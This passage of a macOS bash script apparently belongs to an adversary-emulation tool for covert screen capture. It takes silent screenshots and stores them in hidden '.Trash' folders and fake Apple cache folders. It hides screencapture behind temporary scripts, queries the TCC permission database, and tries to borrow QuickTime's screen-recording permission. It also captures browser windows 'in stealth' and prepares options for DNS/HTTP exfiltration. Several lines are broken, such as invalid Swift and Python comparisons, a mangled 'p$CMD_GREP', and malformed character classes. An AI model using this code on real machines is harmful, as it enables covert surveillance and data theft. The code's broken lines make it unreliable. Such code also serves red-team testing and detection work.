    core_debug_print "Executing functions for --tcc-query"
    result=$(query_tcc_permissions)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --process-scan
if [ "$PROCESS_SCAN" = true ]; then
    core_debug_print "Executing functions for --process-scan"
    result=$(scan_privileged_processes)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --tcc-proxy
if [ "$TCC_PROXY" = true ]; then
    core_debug_print "Executing functions for --tcc-proxy"
    result=$(capture_tcc_proxy_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for -a|--all-methods
if [ "$ALL_METHODS" = true ]; then
    core_debug_print "Executing functions for -a|--all-methods"
    result=$(capture_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(capture_hidden_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(capture_masquerade_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(capture_cache_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(capture_osascript_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(capture_swift_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(capture_python_screenshot)
    raw_output="${raw_output}${result}\n"
    result=$(query_tcc_permissions)
    raw_output="${raw_output}${result}\n"
    result=$(scan_privileged_processes)
    raw_output="${raw_output}${result}\n"
    result=$(capture_tcc_proxy_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Set data source
data_source="1113_screen_capture"
        # This section is intentionally left empty as it will be filled by
        # technique-specific implementations when sourcing this base script
        # If no raw_output is set by the script, exit gracefully
        if [ -z "$raw_output" ]; then
            return 0
        fi  
    fi
    # Process the output (format, encode, encrypt)
    processed_output=$(core_process_output "$raw_output" "$data_source")
    
    # Handle the final output (log, exfil, or display)
    core_transform_output "$processed_output"
}


# Purpose: Validate parsed arguments for correctness and security
# Inputs: None (uses global variables set by core_parse_args)
# Outputs: 0 if valid, 1 if invalid
# Side Effects: Prints error messages for invalid arguments but continues execution
core_validate_parsed_args() {
    local validation_errors=""
    local has_valid_actions=false
    
    # Check if we have any valid actions to execute
    if [ "$LIST_FILES" = true ] || [ "$STEG_EXTRACT" = true ] || [ "$SHOW_HELP" = true ]; then
        has_valid_actions=true
    fi
    
    # Validate chunk size if provided
    if [ -n "$CHUNK_SIZE" ]; then
        if ! core_validate_input "$CHUNK_SIZE" "integer"; then
            validation_errors="${validation_errors}Invalid chunk size: $CHUNK_SIZE (must be positive integer)\n"
        fi
    fi
    
    # Validate format if provided
    if [ -n "$FORMAT" ]; then
        case "$FORMAT" in
            json|csv|raw) ;;
            *) 
                validation_errors="${validation_errors}Invalid format: $FORMAT (must be json, csv, or raw)\n"
                ;;
        esac
    fi
    
    # Validate encoding if provided
    if [ -n "$ENCODE" ] && [ "$ENCODE" != "none" ]; then
        case "$ENCODE" in
            base64|b64|hex|perl_b64|perl_utf8) ;;
            *)
                validation_errors="${validation_errors}Invalid encoding: $ENCODE (must be base64, hex, perl_b64, or perl_utf8)\n"
                ;;
        esac
    fi
    
    # Validate encryption if provided
    if [ -n "$ENCRYPT" ] && [ "$ENCRYPT" != "none" ]; then
        case "$ENCRYPT" in
            aes|gpg|xor) ;;
            *)
                validation_errors="${validation_errors}Invalid encryption: $ENCRYPT (must be aes, gpg, or xor)\n"
                ;;
        esac
    fi
    
    # Validate exfiltration settings
    if [ "$EXFIL" = true ]; then
        if [ -z "$EXFIL_METHOD" ]; then
            validation_errors="${validation_errors}Exfiltration enabled but no method specified\n"
        fi
        
        if [ -z "$EXFIL_URI" ]; then
            validation_errors="${validation_errors}Exfiltration enabled but no URI specified\n"
        else
            # Validate the URI based on method
            case "$EXFIL_METHOD" in
                dns)
                    if ! core_validate_input "$EXFIL_URI" "domain"; then
                        validation_errors="${validation_errors}Invalid domain format: $EXFIL_URI\n"
                    elif ! core_validate_domain "$EXFIL_URI"; then
                        validation_errors="${validation_errors}Domain does not resolve: $EXFIL_URI\n"
                    fi
                    ;;
                http|https)
                    if ! core_validate_input "$EXFIL_URI" "url"; then
                        validation_errors="${validation_errors}Invalid URL format: $EXFIL_URI\n"
                    else
                        # Extract and validate domain
                        local domain=$(core_extract_domain_from_url "$EXFIL_URI")
                        if ! core_validate_domain "$domain"; then
                            validation_errors="${validation_errors}Domain does not resolve: $domain (from URL: $EXFIL_URI)\n"
                        fi
                    fi
                    ;;
                *)
                    validation_errors="${validation_errors}Invalid exfiltration method: $EXFIL_METHOD\n"
                    ;;
            esac
        fi
    fi
    
    # Validate file paths if provided
    if [ -n "$STEG_EXTRACT_FILE" ]; then
        if ! core_validate_input "$STEG_EXTRACT_FILE" "file_path"; then
            validation_errors="${validation_errors}Invalid file path: $STEG_EXTRACT_FILE\n"
        fi
    fi
    
    if [ -n "$STEG_CARRIER_IMAGE" ]; then
        if ! core_validate_input "$STEG_CARRIER_IMAGE" "file_path"; then
            validation_errors="${validation_errors}Invalid carrier image path: $STEG_CARRIER_IMAGE\n"
        fi
    fi
    
    if [ -n "$STEG_OUTPUT_IMAGE" ]; then
        if ! core_validate_input "$STEG_OUTPUT_IMAGE" "file_path"; then
            validation_errors="${validation_errors}Invalid output image path: $STEG_OUTPUT_IMAGE\n"
        fi
    fi
    
    # Validate proxy URL if provided
    if [ -n "$PROXY_URL" ]; then
        if ! core_validate_input "$PROXY_URL" "url"; then
            validation_errors="${validation_errors}Invalid proxy URL: $PROXY_URL\n"
        fi
    fi
    
    # Report all validation errors at once
    if [ -n "$validation_errors" ]; then
        # If we have valid actions, continue; otherwise exit
        if [ "$has_valid_actions" = true ]; then
            # Format as single line warning since script continues
            local formatted_errors=$("$CMD_PRINTF"  "%b" "$validation_errors" | tr '\n' '; ' | sed 's/; $//')
            "$CMD_PRINTF"  "[WARNING] [%s] Argument validation issues found: %s\n" "$(core_get_timestamp)" "$formatted_errors" >&2
            return 0
        else
            core_handle_error "Argument validation errors found:"
            "$CMD_PRINTF"  "%b" "$validation_errors" >&2
            core_handle_error "No valid actions specified - exiting"
            return 1
        fi
    fi
    
    core_debug_print "All parsed arguments validated successfully"
    return 0
}

# Purpose: Generate encryption key if encryption is enabled
# Inputs: None (uses global ENCRYPT variable)
# Outputs: None
# Side Effects: Sets global ENCRYPT_KEY variable
core_generate_encryption_key() {
    if [ "$ENCRYPT" != "none" ]; then
        ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
        if [ "$DEBUG" = true ]; then
            $CMD_PRINTF "[DEBUG] [%s] Using encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
        fi
        core_debug_print "Encryption key generated for method: $ENCRYPT"
    fi
}

# Generate job ID now that core functions are defined

# Functions from YAML procedure

# Function: capture_screenshot
# Description: Capture a silent screenshot
capture_screenshot() {
    $CMD_PRINTF "SCREENSHOT|capturing|Silent screenshot\\n"
    
    # Capture screenshot silently (no sound, no UI)
    screencapture -x "$SCREENSHOT_PATH"
    
    if [ -f "$SCREENSHOT_PATH" ]; then
        file_size=$(stat -f%z "$SCREENSHOT_PATH")
        $CMD_PRINTF "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
    else
        $CMD_PRINTF "SCREENSHOT|failed|Could not capture screenshot\\n"
    fi
}


# Function: capture_screenshot_with_info
# Description: Capture screenshot and display info
capture_screenshot_with_info() {
    $CMD_PRINTF "SCREENSHOT|capturing|Screenshot with display info\\n"
    
    # Get display information first
    display_count=$(system_profiler SPDisplaysDataType | $CMD_GREP -c "Resolution:")
    $CMD_PRINTF "SCREENSHOT|displays|%s\\n" "$display_count"
    
    # Capture screenshot
    screencapture -x "$SCREENSHOT_PATH"
    
    if [ -f "$SCREENSHOT_PATH" ]; then
        file_size=$(stat -f%z "$SCREENSHOT_PATH")
        $CMD_PRINTF "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
        
        # Get image dimensions
        image_info=$(file "$SCREENSHOT_PATH")
        $CMD_PRINTF "SCREENSHOT|info|%s\\n" "$image_info"
    else
        $CMD_PRINTF "SCREENSHOT|failed|Could not capture screenshot\\n"
    fi
}


# Function: capture_hidden_screenshot
# Description: Capture screenshot with hidden storage in .Trash
capture_hidden_screenshot() {
    # Create hidden directory in .Trash
    mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
    local output_path="$HOME/.Trash/.ss/$(date +%Y%m%d_%H%M%S).jpg"
    
    $CMD_PRINTF "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\\n"
    
    # Direct screencapture to hidden location
    screencapture -x "$output_path" 2>/dev/null
    
    if [ -f "$output_path" ]; then
        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
        $CMD_PRINTF "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
    else
        $CMD_PRINTF "HIDDEN_SCREENSHOT|failed|capture failed\\n"
        return 1
    fi
}


# Function: capture_masquerade_screenshot
# Description: Capture screenshot using process name masquerading
capture_masquerade_screenshot() {
    # Create hidden directory with random name
    local random_dir="$HOME/.Trash/.$(openssl rand -hex 4)"
    mkdir -p "$random_dir" 2>/dev/null
    local output_path="$random_dir/temp_$(date +%s).jpg"
    
    $CMD_PRINTF "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\\n"
    
    # Create a temporary script that runs screencapture
    local temp_script="/tmp/capture_$(openssl rand -hex 4).sh"
    $CMD_PRINTF "%s\n" "#!/bin/sh" > "$temp_script"
    $CMD_PRINTF "%s\n" "screencapture -x '$output_path'" >> "$temp_script"
    chmod +x "$temp_script"
    
    # Execute via temporary script (hides screencapture in process list)
    "$temp_script" 2>/dev/null
    rm -f "$temp_script" 2>/dev/null
    
    if [ -f "$output_path" ]; then
        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
        $CMD_PRINTF "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
    else
        $CMD_PRINTF "MASQUERADE_SCREENSHOT|failed|capture failed\\n"
        return 1
    fi
}


# Function: capture_cache_screenshot
# Description: Capture screenshot stored in realistic cache directory
capture_cache_screenshot() {
    # Create realistic cache directory
    mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
    local output_path="$HOME/Library/Caches/com.apple.screencapture/capture_$(date +%s).jpg"
    
    $CMD_PRINTF "CACHE_SCREENSHOT|capturing|Using realistic cache directory\\n"
    
    # Direct screencapture to cache location
    screencapture -x "$output_path" 2>/dev/null
    
    if [ -f "$output_path" ]; then
        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
        $CMD_PRINTF "CACHE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
    else
        $CMD_PRINTF "CACHE_SCREENSHOT|failed|capture failed\\n"
        return 1
    fi
}


# Function: capture_osascript_screenshot
# Description: Capture screenshot using osascript/AppleScript interpreter
capture_osascript_screenshot() {
    # Create hidden directory in .Trash
    mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
    local output_path="$HOME/.Trash/.ss/osascript_$(date +%Y%m%d_%H%M%S).jpg"
    
    $CMD_PRINTF "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\\n"
    
    # Use osascript to execute screencapture (may prompt for automation permissions)
    osascript -e "tell application \"System Events\" to do shell script \"screencapture -x '$output_path'\"" 2>/dev/null
    
    if [ -f "$output_path" ]; then
        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
        $CMD_PRINTF "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
    else
        $CMD_PRINTF "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\\n"
        return 1
    fi
}


# Function: capture_swift_screenshot
# Description: Capture screenshot using Swift system commands
capture_swift_screenshot() {
    mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
    local output_path="$HOME/Library/Caches/com.apple.screencapture/swift_$(date +%s).jpg"
    
    $CMD_PRINTF "SWIFT_SCREENSHOT|capturing|Using Swift Process class (standard library)\\n"
    
    # Create temporary Swift script (no external dependencies)
    local swift_script="/tmp/screenshot_$(openssl rand -hex 4).swift"
    $CMD_PRINTF "%s\n" 'import Foundation' > "$swift_script"
    $CMD_PRINTF "%s\n" 'let outputPath = CommandLine.arguments[1]' >> "$swift_script"
    $CMD_PRINTF "%s\n" 'let process = Process()' >> "$swift_script"
    $CMD_PRINTF "%s\n" 'process.launchPath = "/usr/sbin/screencapture"' >> "$swift_script"
    $CMD_PRINTF "%s\n" 'process.arguments = ["-x", outputPath]' >> "$swift_script"
    $CMD_PRINTF "%s\n" 'process.launch()' >> "$swift_script"
    $CMD_PRINTF "%s\n" 'process.waitUntilExit()' >> "$swift_script"
    $CMD_PRINTF "%s\n" 'if process.terminationStatus = 0 {' >> "$swift_script"
    $CMD_PRINTF "%s\n" '    let fileManager = FileManager.default' >> "$swift_script"
    $CMD_PRINTF "%s\n" '    if fileManager.fileExists(atPath: outputPath) {' >> "$swift_script"
    $CMD_PRINTF "%s\n" '        if let attributes = try? fileManager.attributesOfItem(atPath: outputPath),' >> "$swift_script"
    $CMD_PRINTF "%s\n" '           let fileSize = attributes[FileAttributeKey.size] as? Int64 {' >> "$swift_script"
    $CMD_PRINTF "%s\n" '            print("SUCCESS: \\(outputPath) (\\(fileSize) bytes)")' >> "$swift_script"
    $CMD_PRINTF "%s\n" '        }' >> "$swift_script"
    $CMD_PRINTF "%s\n" '    } else { exit(1) }' >> "$swift_script"
    $CMD_PRINTF "%s\n" '} else { exit(1) }' >> "$swift_script"
    
    local result=$(swift "$swift_script" "$output_path" 2>/dev/null)
    rm -f "$swift_script"
    
    if $CMD_PRINTF "%s\n" "$result" | $CMD_GREP -q "SUCCESS:"; then
        $CMD_PRINTF "SWIFT_SCREENSHOT|captured|%s\\n" "$result"
    else
        $CMD_PRINTF "SWIFT_SCREENSHOT|failed|capture failed\\n"
        return 1
    fi
}


# Function: capture_python_screenshot
# Description: Capture screenshot using Python system commands
capture_python_screenshot() {
    mkdir -p "$HOME/.local/share" 2>/dev/null
    local output_path="$HOME/.local/share/python_$(openssl rand -hex 4).jpg"
    
    $CMD_PRINTF "PYTHON_SCREENSHOT|capturing|Using Python subprocess (standard library)\\n"
    
    # Create temporary Python script (no external dependencies)
    local python_script="/tmp/screenshot_$(openssl rand -hex 4).py"
    $CMD_PRINTF "%s\n" 'import subprocess' > "$python_script"
    $CMD_PRINTF "%s\n" 'import sys' >> "$python_script"
    $CMD_PRINTF "%s\n" 'import os' >> "$python_script"
    $CMD_PRINTF "%s\n" 'output_path = sys.argv[1]' >> "$python_script"
    $CMD_PRINTF "%s\n" 'try:' >> "$python_script"
    $CMD_PRINTF "%s\n" '    result = subprocess.run(["/usr/sbin/screencapture", "-x", output_path], capture_output=True, text=True, timeout=10)' >> "$python_script"
    $CMD_PRINTF "%s\n" '    if result.returncode = 0 and os.path.exists(output_path):' >> "$python_script"
    $CMD_PRINTF "%s\n" '        size = os.path.getsize(output_path)' >> "$python_script"
    $CMD_PRINTF "%s\n" '        print(f"SUCCESS: {output_path} ({size} bytes)")' >> "$python_script"
    $CMD_PRINTF "%s\n" '    else:' >> "$python_script"
    $CMD_PRINTF "%s\n" '        sys.exit(1)' >> "$python_script"
    $CMD_PRINTF "%s\n" 'except Exception:' >> "$python_script"
    $CMD_PRINTF "%s\n" '    sys.exit(1)' >> "$python_script"
    
    local result=$(python3 "$python_script" "$output_path" 2>/dev/null)
    rm -f "$python_script"
    
    if $CMD_PRINTF "%s\n" "$result" | $CMD_GREP -q "SUCCESS:"; then
        $CMD_PRINTF "PYTHON_SCREENSHOT|captured|%s\\n" "$result"
    else
        $CMD_PRINTF "PYTHON_SCREENSHOT|failed|capture failed\\n"
        return 1
    fi
}


# Function: query_tcc_permissions
# Description: Query TCC database for screen recording permissions
query_tcc_permissions() {
    $CMD_PRINTF "TCC_QUERY|checking|Screen recording permissions in TCC database\\n"
    
    local user_tcc="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
    local system_tcc="/Library/Application Support/com.apple.TCC/TCC.db"
    
    # Check TCC database accessibility
    if [ -r "$user_tcc" ]; then
        $CMD_PRINTF "TCC_QUERY|user_db|Accessible for reading\\n"
        
        # Query for screen capture services
        local screen_services=$($CMD_SQLITE3 "$user_tcc" "SELECT DISTINCT service FROM access WHERE service LIKE '%Screen%' OR service LIKE '%kTCC%';" 2>/dev/null)
        if [ -n "$screen_services" ]; then
            $CMD_PRINTF "TCC_QUERY|services|%s\\n" "$screen_services"
            
            # Get specific permissions
            $CMD_SQLITE3 "$user_tcc" "SELECT service, client, auth_value FROM access WHERE service LIKE '%Screen%';" 2>/dev/null | while IFS='|' read -r service client allowed; do
                [ -n "$service" ] && $CMD_PRINTF "TCC_QUERY|permission|%s: %s (auth_value: %s)\\n" "$service" "$client" "$allowed"
            done
        else
            $CMD_PRINTF "TCC_QUERY|services|No screen-related services found\\n"
        fi
    else
        $CMD_PRINTF "TCC_QUERY|user_db|Protected (normal behavior)\\n"
    fi
    
    # Check system TCC database
    if [ -r "$system_tcc" ]; then
        $CMD_PRINTF "TCC_QUERY|system_db|Accessible (unusual - may indicate compromise)\\n"
    else
        $CMD_PRINTF "TCC_QUERY|system_db|Protected (normal)\\n"
    fi
}


# Function: scan_privileged_processes
# Description: Scan for processes that might have screen recording permissions
scan_privileged_processes() {
    $CMD_PRINTF "PROCESS_SCAN|scanning|Processes that might have screen recording permissions\\n"
    
    # Screen Time processes (system level)
    local screen_time_pids=$(p$CMD_GREP -f "ScreenTime" 2>/dev/null)
    if [ -n "$screen_time_pids" ]; then
        $CMD_PRINTF "PROCESS_SCAN|found|ScreenTime processes: %s\\n" "$screen_time_pids"
    fi
    
    # Look for apps with screen recording capabilities
    local recording_apps="QuickTime|Screenshot|OBS|Zoom|Teams|Skype|Discord"
    ps aux | $CMD_GREP -iE "$recording_apps" | $CMD_GREP -v $CMD_GREP | while IFS= read -r process; do
        local app_name=$($CMD_PRINTF "%s\n" "$process" | $CMD_AWK '{print $11}' | xargs basename)
        local pid=$($CMD_PRINTF "%s\n" "$process" | $CMD_AWK '{print $2}')
        $CMD_PRINTF "PROCESS_SCAN|potential|%s (PID: %s)\\n" "$app_name" "$pid"
    done
    
    # Check for loginwindow (system process with broad permissions)
    local loginwindow_pid=$(p$CMD_GREP loginwindow | $CMD_HEAD -1)
    if [ -n "$loginwindow_pid" ]; then
        $CMD_PRINTF "PROCESS_SCAN|system|loginwindow (PID: %s) - system process with elevated permissions\\n" "$loginwindow_pid"
    fi
}


# Function: capture_tcc_proxy_screenshot
# Description: Find and use apps with existing screen recording permissions
capture_tcc_proxy_screenshot() {
    mkdir -p "$HOME/.Trash/.ss/proxy" 2>/dev/null
    local output_path="$HOME/.Trash/.ss/proxy/tcc_proxy_$(date +%s).jpg"
    
    $CMD_PRINTF "TCC_PROXY|attempting|Using apps with existing permissions\\n"
    
    # Try QuickTime Player if available
    if [ -d "/Applications/QuickTime Player.app" ]; then
        $CMD_PRINTF "TCC_PROXY|trying|QuickTime Player\\n"
        
        # Attempt to use QuickTime's potential permissions
        osascript -e 'tell application "QuickTime Player"' -e 'do shell script "screencapture -x '"$output_path"'"' -e 'end tell' 2>/dev/null
        
        if [ -f "$output_path" ]; then
            file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
            $CMD_PRINTF "TCC_PROXY|success|QuickTime proxy: %s (%s bytes)\\n" "$output_path" "$file_size"
            return 0
        fi
    fi
    
    # Try Screen Time app if running
    local screen_time_pid=$(p$CMD_GREP -f "Screen Time" | $CMD_HEAD -1)
    if [ -n "$screen_time_pid" ]; then
        $CMD_PRINTF "TCC_PROXY|trying|Screen Time process (PID: %s)\\n" "$screen_time_pid"
        # This would require more advanced techniques like process injection
        $CMD_PRINTF "TCC_PROXY|note|Would require process injection techniques\\n"
    fi
    
    $CMD_PRINTF "TCC_PROXY|failed|No accessible proxy apps found\\n"
    return 1
}


# Function: list_available_windows
# Description: List available windows for targeted screenshot capture
list_available_windows() {
    $CMD_PRINTF "WINDOW_LIST|enumerating|Available windows for capture\\n"
    
    # List windows with IDs using screencapture
    screencapture -l 2>/dev/null | while IFS= read -r line; do
        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "^[ :space: ]*[0-9]"; then
            window_id=$($CMD_PRINTF "%s\n" "$line" | $CMD_AWK '{print $1}')
            window_name=$($CMD_PRINTF "%s\n" "$line" | cut -d' ' -f2-)
            $CMD_PRINTF "WINDOW_LIST|found|ID:%s Name:%s\\n" "$window_id" "$window_name"
        fi
    done
    
    # Also list running applications
    $CMD_PRINTF "WINDOW_LIST|apps|Running applications:\\n"
    osascript -e 'tell application "System Events" to get name of every application process whose visible is true' 2>/dev/null | $CMD_TR ',' '\n' | while IFS= read -r app; do
        clean_app=$($CMD_PRINTF "%s\n" "$app" | $CMD_SED 's/^[ :space: ]*//;s/[ :space: ]*$//')
        $CMD_PRINTF "WINDOW_LIST|app|%s\\n" "$clean_app"
    done
}


# Function: capture_window_screenshot
# Description: Capture screenshot of specific window by ID
capture_window_screenshot() {
    mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
    local output_path="$HOME/.Trash/.ss/window_$(date +%Y%m%d_%H%M%S).jpg"
    
    $CMD_PRINTF "WINDOW_SCREENSHOT|capturing|Capturing specific window\\n"
    
    # Get the first available window ID if none specified
    local window_id=$(screencapture -l 2>/dev/null | $CMD_GREP "^[ :space: ]*[0-9]" | $CMD_HEAD -1 | $CMD_AWK '{print $1}')
    
    if [ -n "$window_id" ]; then
        # Capture specific window
        screencapture -x -l "$window_id" "$output_path" 2>/dev/null
        
        if [ -f "$output_path" ]; then
            file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
            $CMD_PRINTF "WINDOW_SCREENSHOT|captured|Window ID %s: %s (%s bytes)\\n" "$window_id" "$output_path" "$file_size"
        else
            $CMD_PRINTF "WINDOW_SCREENSHOT|failed|Could not capture window %s\\n" "$window_id"
            return 1
        fi
    else
        $CMD_PRINTF "WINDOW_SCREENSHOT|failed|No windows available for capture\\n"
        return 1
    fi
}


# Function: capture_browser_windows
# Description: Capture screenshots of all browser windows
capture_browser_windows() {
    mkdir -p "$HOME/.Trash/.ss/browsers" 2>/dev/null
    local captured_count=0
    
    $CMD_PRINTF "BROWSER_SCREENSHOT|capturing|All browser windows (stealth mode)\\n"
    
    # Get all windows and filter for browser windows without activating them
    screencapture -l 2>/dev/null | while IFS= read -r line; do
        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "^[ :space: ]*[0-9]"; then
            window_id=$($CMD_PRINTF "%s\n" "$line" | $CMD_AWK '{print $1}')
            window_name=$($CMD_PRINTF "%s\n" "$line" | cut -d' ' -f2-)
            
            # Check if window belongs to a browser (case insensitive)
            if $CMD_PRINTF "%s\n" "$window_name" | $CMD_GREP -iq -E "(safari|chrome|firefox|edge|brave|opera)"; then
                browser_name=$($CMD_PRINTF "%s\n" "$window_name" | $CMD_SED -E 's/.*[ :space: ]([ :alpha: ]+)[ :space: ].*/\1/' | $CMD_TR '[:upper:]' '[:lower:]')
                local output_path="$HOME/.Trash/.ss/browsers/${browser_name}_window_${window_id}_$(date +%s).jpg"
                
                # Capture specific browser window without activating it
                screencapture -x -l "$window_id" "$output_path" 2>/dev/null
                
                if [ -f "$output_path" ]; then
                    file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
                    $CMD_PRINTF "BROWSER_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
                    captured_count=$((captured_count + 1))
                fi
            fi
        fi
    done
    
    if [ "$captured_count" -eq 0 ]; then
        $CMD_PRINTF "BROWSER_SCREENSHOT|failed|No browser windows found\\n"
        return 1
    else
        $CMD_PRINTF "BROWSER_SCREENSHOT|summary|Captured %d browser windows (stealth)\\n" "$captured_count"
    fi
}


# Function: capture_app_windows
# Description: Capture screenshots of all application windows
capture_app_windows() {
    mkdir -p "$HOME/.Trash/.ss/apps" 2>/dev/null
    local captured_count=0
    
    $CMD_PRINTF "APP_SCREENSHOT|capturing|All application windows\\n"
    
    # Get list of all window IDs and capture each
    screencapture -l 2>/dev/null | $CMD_GREP "^[ :space: ]*[0-9]" | while IFS= read -r line; do
        window_id=$($CMD_PRINTF "%s\n" "$line" | $CMD_AWK '{print $1}')
        window_name=$($CMD_PRINTF "%s\n" "$line" | cut -d' ' -f2- | $CMD_TR ' /' '_')
        
        if [ -n "$window_id" ] && [ "$window_id" != "0" ]; then
            local output_path="$HOME/.Trash/.ss/apps/app_${window_id}_$(date +%s).jpg"
            
            screencapture -x -l "$window_id" "$output_path" 2>/dev/null
            
            if [ -f "$output_path" ]; then
                file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
                $CMD_PRINTF "APP_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
                captured_count=$((captured_count + 1))
            fi
        fi
    done
    
    $CMD_PRINTF "APP_SCREENSHOT|summary|Captured %d application windows\\n" "$captured_count"
} 


JOB_ID=$(core_generate_job_id)

# Execute main function with all arguments
core_main "$@" 